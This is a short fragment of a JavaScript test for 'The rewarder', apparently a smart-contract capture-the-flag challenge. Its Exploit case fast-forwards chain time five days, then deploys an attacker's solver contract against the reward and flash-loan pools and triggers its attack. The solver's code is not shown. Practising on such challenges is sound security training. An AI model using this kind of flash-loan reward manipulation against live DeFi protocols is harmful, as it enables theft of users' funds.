...
describe("[Challenge] The rewarder", function () {
    ...
    it("Exploit", async function () {
        ...
        // Advance time 5 days so that the attacker can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]) // 5 days
        const TheRewarderSolverFactory = await ethers.getContractFactory(
            "TheRewarderSolver",
            attacker
        )
        const solver = await TheRewarderSolverFactory.deploy(
            this.rewarderPool.address,
            this.flashLoanPool.address
        )
        await solver.attack(TOKENS_IN_LENDER_POOL)
    })
